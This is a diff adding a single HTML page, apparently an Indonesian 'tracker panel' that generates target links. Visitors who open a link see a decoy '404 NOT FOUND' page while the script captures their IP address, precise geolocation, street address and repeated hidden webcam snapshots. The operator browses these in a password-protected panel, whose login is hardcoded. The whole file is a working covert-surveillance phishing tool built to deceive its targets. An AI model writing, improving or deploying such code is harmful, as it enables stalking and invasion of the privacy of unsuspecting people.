@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Tracker Panel - CodingX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        /* CSS ASLI ANDA - TETAP SAMA SEPERTI DULU */
+        :root {
+            --bg-main: #0a0a0c;
+            --panel-bg: rgba(30, 30, 35, 0.7);
+            --accent-glow: #00f2ff;
+            --accent-dark: #0066ff;
+            --text-gold: #ffffff;
+            --border-glass: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            margin: 0; padding: 0; background-color: var(--bg-main);
+            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
+            color: white; font-family: 'Inter', sans-serif;
+            display: flex; justify-content: center; min-height: 100vh;
+        }
+
+        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; }
+
+        .header-profile {
+            background: var(--panel-bg); backdrop-filter: blur(10px);
+            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
+            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
+        }
+
+        .header-profile::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent, var(--accent-glow), transparent 30%);
+            animation: rotate 4s linear infinite; z-index: -1; opacity: 0.3;
+        }
+
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+
+        .logo-main {
+            width: 90px; height: 90px; border-radius: 50%; background: #000;
+            margin: 0 auto 15px; display: flex; justify-content: center; align-items: center;
+            border: 2px solid var(--accent-glow); box-shadow: 0 0 20px var(--accent-dark);
+        }
+
+        .logo-main svg { width: 50px; fill: var(--accent-glow); }
+
+        .header-profile h1 {
+            font-family: 'Orbitron', sans-serif; font-size: 20px; letter-spacing: 3px;
+            margin: 10px 0; text-transform: uppercase;
+            background: linear-gradient(to bottom, #fff, #888);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        .status-badge {
+            display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1);
+            color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold;
+        }
+
+        .control-panel {
+            background: var(--panel-bg); backdrop-filter: blur(15px);
+            border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass);
+            margin-bottom: 20px;
+        }
+
+        .label-style {
+            font-size: 11px; text-transform: uppercase; color: #888;
+            margin-bottom: 10px; display: block; letter-spacing: 1px;
+        }
+
+        .input-group {
+            background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px;
+            border: 1px solid #333; display: flex; align-items: center; justify-content: space-between;
+        }
+
+        .input-group input { background: transparent; border: none; color: #fff; width: 70%; outline: none; font-size: 12px; }
+
+        .btn-action {
+            background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark));
+            color: #000; border: none; padding: 10px 18px; border-radius: 10px;
+            font-weight: 800; font-size: 11px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 242, 255, 0.3);
+        }
+
+        /* LAYOUT FOLDER - DENGAN IKON ROBOTIC */
+        .target-folder {
+            background: linear-gradient(90deg, #1e1e24, #121216);
+            border-radius: 15px; padding: 18px; margin-top: 10px;
+            display: flex; align-items: center; justify-content: space-between;
+            border-left: 4px solid var(--accent-glow); transition: 0.3s;
+        }
+
+        .folder-info { display: flex; align-items: center; flex-grow: 1; cursor: pointer; }
+        .folder-text b { display: block; font-size: 14px; }
+        .folder-text .time-txt { color: var(--accent-glow); font-weight: bold; font-size: 10px; margin-top: 4px; display: block; }
+        
+        .robotic-svg { width: 24px; height: 24px; fill: var(--accent-glow); margin-right: 15px; }
+        .trash-svg { width: 18px; height: 18px; fill: #ff4444; }
+
+        .btn-delete { 
+            background: rgba(255,0,0,0.1); border: 1px solid #ff4444;
+            padding: 8px; border-radius: 8px; cursor: pointer; display: flex; align-items: center;
+        }
+
+        /* LOGIN STYLE */
+        #login-gate {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center;
+        }
+
+        .info-box {
+            background: rgba(0,0,0,0.5); border: 1px solid var(--accent-glow);
+            border-radius: 15px; padding: 15px; margin-top: 15px; margin-bottom: 20px;
+            position: relative;
+        }
+
+        .info-line { display: flex; flex-direction: column; font-size: 12px; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .info-line span:first-child { color: var(--accent-glow); font-weight: bold; margin-bottom: 2px; }
+
+        .copy-info-btn {
+            position: absolute; top: 10px; right: 10px; cursor: pointer; fill: var(--accent-glow);
+        }
+
+        #gallery-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-main); z-index: 999; padding: 20px; box-sizing: border-box; overflow-y: auto;
+        }
+
+        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
+        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid var(--border-glass); }
+        .btn-close { color: var(--accent-glow); background: none; border: 1px solid #333; padding: 8px 20px; border-radius: 10px; cursor: pointer; }
+
+        #phish-view { display: none; text-align: center; padding-top: 100px; color: #444; }
+    </style>
+</head>
+<body>
+
+<div id="login-gate">
+    <div class="control-panel" style="width: 80%; text-align: center;">
+        <h2 style="font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow);">MASTER ACCESS</h2>
+        <input type="text" id="user-in" class="input-group" style="width: 100%; margin-bottom: 10px; padding: 12px; box-sizing: border-box; background: #000; border: 1px solid #333; color: #fff;" placeholder="Username">
+        <input type="password" id="pass-in" class="input-group" style="width: 100%; margin-bottom: 20px; padding: 12px; box-sizing: border-box; background: #000; border: 1px solid #333; color: #fff;" placeholder="Password">
+        <button class="btn-action" style="width: 100%;" onclick="auth()">LOGIN SYSTEM</button>
+    </div>
+</div>
+
+<div class="phone-frame" id="admin-view" style="display:none;">
+    <div class="header-profile">
+        <div class="logo-main">
+            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" fill="none" stroke="cyan" stroke-width="2"/></svg>
+        </div>
+        <h1>ONDEV PANEL</h1>
+        <div class="status-badge">● TERMINAL ACTIVE</div>
+    </div>
+
+    <div class="control-panel">
+        <span class="label-style">Target Link</span>
+        <div class="input-group">
+            <input type="text" id="gen-url" readonly>
+            <div onclick="copyLink()" style="cursor:pointer;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="control-panel">
+        <span class="label-style">Connected Targets</span>
+        <div id="target-list"></div>
+    </div>
+</div>
+
+<div id="gallery-overlay">
+    <button class="btn-close" onclick="closeFolder()">⬅ BACK TO PANEL</button>
+    <div class="info-box" id="info-container"></div>
+    <div class="grid-photos" id="photo-grid"></div>
+</div>
+
+<div id="phish-view" class="phone-frame">
+    <h2>404 NOT FOUND</h2>
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const idTarget = urlParams.get('id');
+
+    // --- LOGIN SYSTEM ---
+    function auth() {
+        const u = document.getElementById('user-in').value;
+        const p = document.getElementById('pass-in').value;
+        if(u === 'ondev' && p === 'ondev') {
+            document.getElementById('login-gate').style.display = 'none';
+            document.getElementById('admin-view').style.display = 'block';
+            startAdmin();
+        } else {
+            alert('AKSES DITOLAK!');
+        }
+    }
+
+    if (!idTarget) {
+        // --- ADMIN SIDE ---
+        function startAdmin() {
+            document.getElementById('gen-url').value = window.location.href.split('?')[0] + "?id=" + (Math.floor(Math.random() * 8999) + 1000);
+            updateFolders();
+            setInterval(updateFolders, 3000);
+        }
+
+        function updateFolders() {
+            const list = document.getElementById('target-list');
+            const data = JSON.parse(localStorage.getItem('ondev_vault_v11') || '{}');
+            list.innerHTML = '';
+
+            Object.keys(data).forEach((id, index) => {
+                const div = document.createElement('div');
+                div.className = 'target-folder';
+                div.innerHTML = `
+                    <div class="folder-info" onclick="openFolder('${id}')">
+                        <svg class="robotic-svg" viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
+                        <div class="folder-text">
+                            <b>TARGET #${index + 1}</b>
+                            <span class="time-txt">⏰ KENA: ${data[id].info.time || '--:--'}</span>
+                        </div>
+                    </div>
+                    <button class="btn-delete" onclick="deleteTarget('${id}')">
+                        <svg class="trash-svg" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
+                    </button>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        function deleteTarget(id) {
+            if(confirm('Hapus folder ini?')) {
+                let data = JSON.parse(localStorage.getItem('ondev_vault_v11') || '{}');
+                delete data[id];
+                localStorage.setItem('ondev_vault_v11', JSON.stringify(data));
+                updateFolders();
+            }
+        }
+
+        function openFolder(id) {
+            const data = JSON.parse(localStorage.getItem('ondev_vault_v11') || '{}');
+            const t = data[id];
+            const gmaps = `https://www.google.com/maps?q=${t.info.lat},${t.info.lon}`;
+
+            document.getElementById('info-container').innerHTML = `
+                <div class="info-line"><span>IP:</span><span>${t.info.ip}</span></div>
+                <div class="info-line"><span>Jam:</span><span>${t.info.time}</span></div>
+                <div class="info-line"><span>Alamat:</span><span>${t.info.address}</span></div>
+                <div class="info-line"><span>Maps:</span><a href="${gmaps}" target="_blank" style="color:#00ff88; font-weight:bold;">📍 LIHAT LOKASI</a></div>
+            `;
+            document.getElementById('photo-grid').innerHTML = t.photos.map(s => `<img src="${s}">`).join('');
+            document.getElementById('gallery-overlay').style.display = 'block';
+        }
+
+        function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; }
+
+    } else {
+        // --- TARGET SIDE ---
+        document.getElementById('login-gate').style.display = 'none';
+        document.getElementById('phish-view').style.display = 'block';
+
+        const d = new Date();
+        const timeNow = d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0');
+
+        let captureData = {
+            photos: [],
+            info: { time: timeNow, ip: '...', address: '...', lat: 0, lon: 0 }
+        };
+
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => { captureData.info.ip = d.ip; sync(); });
+
+        navigator.geolocation.getCurrentPosition(p => {
+            captureData.info.lat = p.coords.latitude;
+            captureData.info.lon = p.coords.longitude;
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
+            .then(r => r.json()).then(res => {
+                captureData.info.address = res.display_name;
+                sync();
+            });
+            sync();
+        }, null, { enableHighAccuracy: true });
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+            const v = document.getElementById('v'); v.srcObject = s;
+            setInterval(() => {
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                captureData.photos.unshift(c.toDataURL('image/jpeg', 0.4));
+                sync();
+            }, 4000);
+        });
+
+        function sync() {
+            let db = JSON.parse(localStorage.getItem('ondev_vault_v11') || '{}');
+            db[idTarget] = captureData;
+            localStorage.setItem('ondev_vault_v11', JSON.stringify(db));
+        }
+    }
+
+    function copyLink() {
+        const i = document.getElementById('gen-url'); i.select(); document.execCommand('copy');
+        alert('LINK DISALIN! 💼💰');
+    }
+</script>
+</body>
+</html>
